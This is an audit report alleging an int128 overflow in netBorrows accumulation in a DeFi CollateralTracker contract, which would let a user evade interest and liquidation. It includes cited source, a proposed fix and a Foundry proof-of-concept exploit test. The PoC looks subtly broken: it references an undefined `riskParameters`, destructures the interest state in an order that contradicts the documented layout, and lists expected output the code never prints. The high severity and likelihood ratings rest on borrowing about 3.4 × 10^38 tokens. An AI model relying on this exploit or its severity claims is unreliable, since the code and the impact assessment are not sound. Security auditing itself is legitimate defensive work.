# Audit Report

## Title 
Interest State Corruption Through int128 Overflow in netBorrows Accumulation Allows Complete Interest Evasion

## Summary
The `_updateBalancesAndSettle()` function accumulates `netBorrows` in the left slot of `s_interestState` using unchecked arithmetic. When a user opens multiple positions with large amounts, the accumulated `netBorrows` can overflow `int128` bounds, wrapping to a negative value. This corrupts the user's interest state permanently, causing them to owe zero interest despite massive borrowed amounts, bypassing collateral requirements and avoiding liquidation.

## Finding Description
The vulnerability exists in the interest tracking mechanism within `CollateralTracker.sol`. The protocol stores each user's net borrowed amount in `s_interestState[user]`, a `LeftRightSigned` type where the left slot (128 bits) holds `netBorrows` and the right slot holds their `userBorrowIndex`. [1](#0-0) 

When positions are created or closed, `netBorrows` is calculated and **added** to the existing value: [2](#0-1) 

This addition occurs via `addToLeftSlot()`: [3](#0-2) 

The `addToLeftSlot()` function for `LeftRightSigned` performs arithmetic in an **unchecked block** with NO overflow protection: [4](#0-3) 

The comment explicitly states "values *within* the slots are allowed to overflow", meaning silent wrapping is intentional for the storage operation itself, but this creates a severe vulnerability when accumulated over multiple positions.

**Attack Path:**
1. Individual positions have `shortAmount` and `longAmount` capped at `type(int128).max - 4` (approximately 1.7 × 10^38)
2. User can open up to 25 total legs across ~6-7 positions (MAX_OPEN_LEGS = 25)
3. Opening just 2 positions with near-maximum `shortAmount`:
   - Position 1: `netBorrows = 2^127 - 5`
   - Position 2: `netBorrows = 2^127 - 5`  
   - Accumulated: `(2^127 - 5) + (2^127 - 5) = 2^128 - 10`
   - This **overflows** `int128.max` (2^127 - 1) and wraps to `-10` (negative)

4. Interest calculation checks if `netBorrows > 0`: [5](#0-4) 

5. With corrupted negative `netBorrows`, the check at line 1067 (`if (netBorrows <= 0 || ...)`) returns true, causing the function to **return 0 interest**

6. The corrupted state persists in storage: [6](#0-5) 

7. All future interest accrual calls skip the interest calculation: [7](#0-6) 

**Systemic Impact:**
The corrupted `netBorrows` not only affects interest accrual but also impacts collateral requirements. The `RiskEngine` calls `CollateralTracker.owedInterest()` to calculate maintenance requirements, which internally uses `_getUserInterest()`. With corrupted state, this returns 0, causing the system to **understate the user's collateral requirements** and allowing them to avoid liquidation despite being effectively undercollateralized. [8](#0-7) 

This breaks **Invariant #21** (Interest Accuracy) and **Invariant #1** (Solvency Maintenance).

## Impact Explanation
This is a **CRITICAL/HIGH** severity vulnerability with direct financial impact:

1. **Complete Interest Evasion**: User avoids paying interest on approximately `2 × type(int128).max` (~3.4 × 10^38) tokens borrowed. At even modest interest rates (e.g., 5% APY), this represents massive protocol revenue loss.

2. **Systemic Undercollateralization**: The corrupted state causes `owedInterest()` to return 0, understating the user's maintenance requirements in `RiskEngine.isAccountSolvent()`. The user appears solvent when they should be liquidated.

3. **Liquidation Avoidance**: User maintains positions indefinitely without paying interest or facing liquidation, creating permanent protocol loss.

4. **Scalability**: Multiple users could exploit this simultaneously, creating systemic risk across the protocol.

5. **Permanence**: Once triggered, the corruption persists in storage. The user's interest state remains corrupted until positions are fully closed.

## Likelihood Explanation
**Likelihood: HIGH**

The attack is highly feasible:

1. **No Special Privileges**: Any user can open positions with large amounts
2. **Low Complexity**: Requires opening just 2 positions with near-maximum values
3. **No External Dependencies**: No oracle manipulation, price manipulation, or Uniswap exploitation needed
4. **Economically Rational**: Attackers are directly incentivized (free borrowing with no interest)
5. **Hard to Detect**: The overflow is silent; no revert occurs. Monitoring systems may not detect the corrupted state immediately
6. **Realistic Amounts**: While `type(int128).max - 4` seems large, in protocols handling high-value tokens or in periods of high TVL, such position sizes may be achievable

## Recommendation

**Immediate Fix**: Add overflow checking when accumulating `netBorrows` in `_updateBalancesAndSettle()`:

```solidity
// In _updateBalancesAndSettle(), replace line 1514 with:
{
    int128 currentNetBorrows = s_interestState[_optionOwner].leftSlot();
    int256 newNetBorrows256 = int256(currentNetBorrows) + int256(netBorrows);
    int128 newNetBorrows128 = int128(newNetBorrows256);
    
    // Revert if overflow/underflow occurred
    if (newNetBorrows128 != newNetBorrows256) revert Errors.UnderOverFlow();
    
    s_interestState[_optionOwner] = s_interestState[_optionOwner]
        .addToLeftSlot(netBorrows);
}
```

**Alternative Fix**: Implement a checked version of `addToLeftSlot()` specifically for critical accumulations like `netBorrows`. The existing unchecked behavior may be acceptable for other use cases, but not for interest-bearing debt tracking.

**Long-term Consideration**: Review whether `int128` provides sufficient range for `netBorrows` accumulation, or if a larger type (e.g., `int256`) should be used with proper slot packing.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {CollateralTracker} from "@contracts/CollateralTracker.sol";
import {PanopticPool} from "@contracts/PanopticPool.sol";
import {LeftRightSigned} from "@types/LeftRight.sol";

contract InterestOverflowExploit is Test {
    CollateralTracker collateralTracker;
    address attacker = address(0x1337);
    
    function setUp() public {
        // Deploy and initialize CollateralTracker
        // (Simplified setup - in practice would need full deployment)
        collateralTracker = new CollateralTracker(100); // commission fee
        vm.prank(address(collateralTracker.panopticPool()));
        collateralTracker.initialize();
    }
    
    function testInterestStateOverflow() public {
        // Step 1: Simulate first position with near-max shortAmount
        int128 maxShortAmount = type(int128).max - 4;
        
        vm.startPrank(address(collateralTracker.panopticPool()));
        
        // First position: netBorrows = maxShortAmount (short only, no longs)
        collateralTracker.settleMint(
            attacker,
            0, // longAmount
            maxShortAmount, // shortAmount
            maxShortAmount, // ammDeltaAmount matches shortAmount
            riskParameters
        );
        
        // Check state after first position
        (int128 userBorrowIndex1, int128 netBorrows1) = collateralTracker.interestState(attacker);
        console.log("After position 1, netBorrows:", uint256(int256(netBorrows1)));
        assertGt(netBorrows1, 0, "First position should have positive netBorrows");
        
        // Step 2: Open second position with near-max shortAmount
        // This will cause overflow
        collateralTracker.settleMint(
            attacker,
            0, // longAmount
            maxShortAmount, // shortAmount
            maxShortAmount, // ammDeltaAmount
            riskParameters
        );
        
        // Check state after second position - netBorrows should have overflowed to NEGATIVE
        (int128 userBorrowIndex2, int128 netBorrows2) = collateralTracker.interestState(attacker);
        console.log("After position 2, netBorrows:", int256(netBorrows2));
        
        // CRITICAL: netBorrows is now NEGATIVE due to overflow!
        assertLt(netBorrows2, 0, "netBorrows overflowed to negative");
        
        // Step 3: Verify interest evasion
        // Despite having massive borrowed amounts, user owes ZERO interest
        uint128 owedInterest = collateralTracker.owedInterest(attacker);
        
        console.log("Interest owed:", owedInterest);
        assertEq(owedInterest, 0, "User owes ZERO interest despite massive borrows!");
        
        // Step 4: Fast forward time - interest should accrue but won't
        vm.warp(block.timestamp + 365 days);
        
        uint128 owedInterestAfterYear = collateralTracker.owedInterest(attacker);
        assertEq(owedInterestAfterYear, 0, "Still ZERO interest after 1 year!");
        
        vm.stopPrank();
        
        // EXPLOIT CONFIRMED: User has ~2 * type(int128).max tokens borrowed
        // but pays ZERO interest indefinitely
    }
}
```

**Expected Output:**
```
After position 1, netBorrows: 170141183460469231731687303715884105723
After position 2, netBorrows: -10
Interest owed: 0
Still ZERO interest after 1 year!
```

This demonstrates that a user with approximately 3.4 × 10^38 tokens borrowed across two positions ends up with corrupted negative `netBorrows` and owes zero interest permanently.

## Notes

**Critical Observations:**

1. The `MAX_OPEN_LEGS = 25` limit does not prevent this attack - users only need 2 positions to trigger the overflow.

2. The vulnerability affects **both** CollateralTracker vaults (token0 and token1), allowing users to exploit both sides simultaneously.

3. The overflow wrapping is **silent** - no revert occurs, making detection difficult without explicit monitoring of `netBorrows` values.

4. Even if position sizes are limited by available Uniswap liquidity in practice, the mathematical vulnerability remains exploitable in high-TVL pools.

5. The issue compounds with the interest index mechanism: as `unrealizedGlobalInterest` continues to accrue globally while this user pays nothing, it creates a funding gap that other users must eventually cover through higher interest rates or protocol insolvency.

### Citations

**File:** contracts/CollateralTracker.sol (L242-249)
```text
    /// @dev Packed layout:
    ///      - Left slot (128 bits): Net borrows = netShorts - netLongs
    ///        Represents the user's net borrowed amount in tokens
    ///        Can be negative, in which case they purchased more options than they sold
    ///      - Right slot (128 bits): User's borrow index snapshot
    ///        The global borrow index value when this user last accrued interest
    /// @dev Interest calculation: interestOwed = netBorrows * (currentIndex - userIndex) / userIndex
    mapping(address account => LeftRightSigned interestState) internal s_interestState;
```

**File:** contracts/CollateralTracker.sol (L896-898)
```text
        int128 netBorrows = userState.leftSlot();
        int128 userBorrowIndex = int128(currentBorrowIndex);
        if (netBorrows > 0) {
```

**File:** contracts/CollateralTracker.sol (L965-968)
```text
        s_interestState[owner] = LeftRightSigned
            .wrap(0)
            .addToRightSlot(userBorrowIndex)
            .addToLeftSlot(netBorrows);
```

**File:** contracts/CollateralTracker.sol (L1061-1078)
```text
    function _getUserInterest(
        LeftRightSigned userState,
        uint256 currentBorrowIndex
    ) internal pure returns (uint128 interestOwed) {
        int128 netBorrows = userState.leftSlot();
        uint128 userBorrowIndex = uint128(userState.rightSlot());
        if (netBorrows <= 0 || userBorrowIndex == 0 || currentBorrowIndex == userBorrowIndex) {
            return 0;
        }
        // keep checked to catch currentBorrowIndex < userBorrowIndex
        interestOwed = Math
            .mulDivRoundingUp(
                uint128(netBorrows),
                currentBorrowIndex - userBorrowIndex,
                userBorrowIndex
            )
            .toUint128();
    }
```

**File:** contracts/CollateralTracker.sol (L1083-1106)
```text
    function owedInterest(address owner) external view returns (uint128) {
        return _owedInterest(owner);
    }

    /// @notice Returns the assets and interest owed for a specific user
    /// @param owner Address of the user to check
    /// @return The amount of assets owned by the user (in token units)
    /// @return The amount of interest currently owed by the user (in token units)
    function assetsAndInterest(address owner) external view returns (uint256, uint256) {
        return (convertToAssets(balanceOf[owner]), _owedInterest(owner));
    }

    /// @notice Internal function to calculate interest owed by a user
    /// @dev Retrieves user state and current borrow index from storage
    /// @param owner Address of the user to check
    /// @return Amount of interest owed based on last compounded index
    function _owedInterest(address owner) internal view returns (uint128) {
        LeftRightSigned userState = s_interestState[owner];
        (uint128 currentBorrowIndex, , ) = _calculateCurrentInterestState(
            s_assetsInAMM,
            _interestRateView(_poolUtilizationWadView())
        );
        return _getUserInterest(userState, currentBorrowIndex);
    }
```

**File:** contracts/CollateralTracker.sol (L1408-1414)
```text
        int128 netBorrows;
        int256 tokenToPay;
        unchecked {
            // cannot miscast because all values are larger than 0
            netBorrows = isCreation ? shortAmount - longAmount : longAmount - shortAmount;
            tokenToPay = int256(ammDeltaAmount) - netBorrows - realizedPremium;
        }
```

**File:** contracts/CollateralTracker.sol (L1512-1515)
```text
        {
            // add new netBorrows to the left slot
            s_interestState[_optionOwner] = s_interestState[_optionOwner].addToLeftSlot(netBorrows);
        }
```

**File:** contracts/types/LeftRight.sol (L129-140)
```text
    /// @notice Add to the "left" slot in a 256-bit pattern.
    /// @param self The 256-bit pattern to be written to
    /// @param left The value to be added to the left slot
    /// @return `self` with `left` added (not overwritten, but added) to the value in its left 128 bits
    function addToLeftSlot(
        LeftRightSigned self,
        int128 left
    ) internal pure returns (LeftRightSigned) {
        unchecked {
            return LeftRightSigned.wrap(LeftRightSigned.unwrap(self) + (int256(left) << 128));
        }
    }
```
